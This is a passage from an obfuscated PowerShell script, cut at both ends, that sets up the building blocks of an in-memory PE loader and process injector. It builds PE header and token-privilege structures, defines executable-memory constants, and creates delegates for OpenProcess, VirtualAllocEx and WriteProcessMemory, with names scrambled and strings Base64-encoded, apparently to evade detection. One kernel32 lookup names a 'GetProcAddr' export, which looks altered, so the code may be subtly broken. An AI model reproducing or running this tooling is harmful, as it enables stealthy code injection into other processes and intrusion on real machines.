		${/==\/\_/===\/\_/=} = ${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${___/=\/\/==\/\__/} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${_/\/\_/=\/\/=====} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=\__/\/==\_/==\/}, ${___/=\/\/==\/\__/}, ${/=\/\/\/\_/=\_/\_}, @([Int32] 10))
		${/==\/\_/===\/\_/=}.SetCustomAttribute(${_/\/\_/=\/\/=====})
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\/===\/\_/\/===} = ${____/\/\_/\__/===}.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${/=\/===\/\_/\/===}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 40)
		${_/\__/\/\/\/\/\/\} = ${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${___/=\/\/==\/\__/} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${_/\/\_/=\/\/=====} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=\__/\/==\_/==\/}, ${___/=\/\/==\/\__/}, ${/=\/\/\/\_/=\_/\_}, @([Int32] 8))
		${_/\__/\/\/\/\/\/\}.SetCustomAttribute(${_/\/\_/=\/\/=====})
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_/\/\/\_/\/===} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${/=\_/\/\/\_/\/===}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${/=\/===\/\__/=\/=}, [System.ValueType], 8)
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/==\/\__/===\___/} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${/==\/\__/===\___/}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 20)
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/==\/=\/===\/\__/} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${/==\/=\/===\/\__/}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 40)
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\/\/\_/=\/====\} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${_/\/\/\_/=\/====\}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 8)
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_____/\_/==\/=\__} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value ${_____/\_/==\/=\__}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 12)
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${_____/\_/==\/=\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\__/=\_/\/\/\/} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${__/\__/=\_/\/\/\/}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 16)
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${__/\__/=\_/\/\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\/\/===\/\/===\} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${/=\/\/===\/\/===\}
		return $Win32Types
	}
	Function Get-Win32Const
	{
		$Win32Const = New-Object System.Object
		$Win32Const | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Const | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Const | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Const | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Const | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Const | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Const | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Const | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Const | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Const | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Const | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Const | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Const | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Const | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Const | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Const | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Const | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Const | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return $Win32Const
	}
	Function ___/\/\_/\/======\
	{
		$Win32Func = New-Object System.Object
		${_/===\/\_/==\/=\_} = ____/\___/\__/=\/= kernel32.dll VirtualAlloc
		${_____/\_/\__/=\/=} = __/\/==\__/=\/===\ @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${_/=\_/\___/\_____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/===\/\_/==\/=\_}, ${_____/\_/\__/=\/=})
		$Win32Func | Add-Member NoteProperty -Name VirtualAlloc -Value ${_/=\_/\___/\_____}
		${/\________/=\_/\_} = ____/\___/\__/=\/= kernel32.dll VirtualAllocEx
		${_/=\/\/=\/===\_/=} = __/\/==\__/=\/===\ @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${/=\_/===\/\_/\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/\________/=\_/\_}, ${_/=\/\/=\/===\_/=})
		$Win32Func | Add-Member NoteProperty -Name VirtualAllocEx -Value ${/=\_/===\/\_/\__/}
		${_/===\_/==\/=\/=\} = ____/\___/\__/=\/= msvcrt.dll memcpy
		${/=\_/==\_/\/\____} = __/\/==\__/=\/===\ @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${___/\/\_/\_/==\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/===\_/==\/=\/=\}, ${/=\_/==\_/\/\____})
		$Win32Func | Add-Member -MemberType NoteProperty -Name memcpy -Value ${___/\/\_/\_/==\/=}
		${_/===\/========\_} = ____/\___/\__/=\/= msvcrt.dll memset
		${/=\_/==\__/\_/\/\} = __/\/==\__/=\/===\ @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${_/\_/\___/====\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/===\/========\_}, ${/=\_/==\__/\_/\/\})
		$Win32Func | Add-Member -MemberType NoteProperty -Name memset -Value ${_/\_/\___/====\/\}
		${_/=====\___/\__/\} = ____/\___/\__/=\/= kernel32.dll LoadLibraryA
		${_/=====\_/\/====\} = __/\/==\__/=\/===\ @([String]) ([IntPtr])
		${/==\_/==\/==\___/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=====\___/\__/\}, ${_/=====\_/\/====\})
		$Win32Func | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${/==\_/==\/==\___/}
		${_/=\/\/\/\/\_/\/=} = ____/\___/\__/=\/= kernel32.dll GetProcAddr
		${_/\/==\/\__/\/\/\} = __/\/==\__/=\/===\ @([IntPtr], [String]) ([IntPtr])
		${_/\_/\_____/=\/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\/\/\/\/\_/\/=}, ${_/\/==\/\__/\/\/\})
		$Win32Func | Add-Member -MemberType NoteProperty -Name GetProcAddr -Value ${_/\_/\_____/=\/\/}
		${/==\____/\/\/=\/=} = ____/\___/\__/=\/= kernel32.dll GetProcAddr
		${__/\/==\/\_/\____} = __/\/==\__/=\/===\ @([IntPtr], [IntPtr]) ([IntPtr])
		${/=\/\_/=\_/\/\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\____/\/\/=\/=}, ${__/\/==\/\_/\____})
		$Win32Func | Add-Member -MemberType NoteProperty -Name GetProcAddrOrdinal -Value ${/=\/\_/=\_/\/\_/=}
		${/=\__/==\___/\/\_} = ____/\___/\__/=\/= kernel32.dll VirtualFree
		${/=\/\/===\__/=\/\} = __/\/==\__/=\/===\ @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${/=\/\/=\/=\_/\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\__/==\___/\/\_}, ${/=\/\/===\__/=\/\})
		$Win32Func | Add-Member NoteProperty -Name VirtualFree -Value ${/=\/\/=\/=\_/\_/=}
		${/=\__/\__/=\____/} = ____/\___/\__/=\/= kernel32.dll VirtualFreeEx
		${___/=\/\/\__/===\} = __/\/==\__/=\/===\ @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${/==\__/===\_/\___} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\__/\__/=\____/}, ${___/=\/\/\__/===\})
		$Win32Func | Add-Member NoteProperty -Name VirtualFreeEx -Value ${/==\__/===\_/\___}
		${__/==\____/==\_/=} = ____/\___/\__/=\/= kernel32.dll VirtualProtect
		${/=\_/=\__/=======} = __/\/==\__/=\/===\ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		${__/\___/\____/==\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/==\____/==\_/=}, ${/=\_/=\__/=======})
		$Win32Func | Add-Member NoteProperty -Name VirtualProtect -Value ${__/\___/\____/==\}
		${_/===\___/==\/=\_} = ____/\___/\__/=\/= kernel32.dll GetModuleHandleA
		${/==\/=\/=\_/\_/==} = __/\/==\__/=\/===\ @([String]) ([IntPtr])
		${_/=\/\__/=\/====\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/===\___/==\/=\_}, ${/==\/=\/=\_/\_/==})
		$Win32Func | Add-Member NoteProperty -Name GetModuleHandle -Value ${_/=\/\__/=\/====\}
		${________/=\/=\/==} = ____/\___/\__/=\/= kernel32.dll FreeLibrary
		${_/=\/\_/\/\/=====} = __/\/==\__/=\/===\ @([IntPtr]) ([Bool])
		${__/\_____/=\/==\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${________/=\/=\/==}, ${_/=\/\_/\/\/=====})
		$Win32Func | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${__/\_____/=\/==\_}
		${_/==\___/=\/\____} = ____/\___/\__/=\/= kernel32.dll OpenProcess
	    ${___/\__/==\_____/} = __/\/==\__/=\/===\ @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${_/\___/====\/=\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/==\___/=\/\____}, ${___/\__/==\_____/})
		$Win32Func | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${_/\___/====\/=\/\}
		${_/\_/\/==\_/\_/==} = ____/\___/\__/=\/= kernel32.dll WaitForSingleObject
	    ${_____/==\___/==\/} = __/\/==\__/=\/===\ @([IntPtr], [UInt32]) ([UInt32])
	    ${/=\/==\/=\_/\/\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\_/\/==\_/\_/==}, ${_____/==\___/==\/})
		$Win32Func | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${/=\/==\/=\_/\/\/\}
		${/==\_/=\__/=\/\__} = ____/\___/\__/=\/= kernel32.dll WriteProcessMemory
        ${/=\_/==\/\/\_/\/\} = __/\/==\__/=\/===\ @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${/====\/\/=\__/\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\_/=\__/=\/\__}, ${/=\_/==\/\/\_/\/\})
		$Win32Func | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${/====\/\/=\__/\_/}
		${/==\/=\/=\_/=\/=\} = ____/\___/\__/=\/= kernel32.dll ReadProcessMemory
        ${_/=\_/\_/==\___/\} = __/\/==\__/=\/===\ @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${__/\/=\/\_/=\_/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\/=\/=\_/=\/=\}, ${_/=\_/\_/==\___/\})
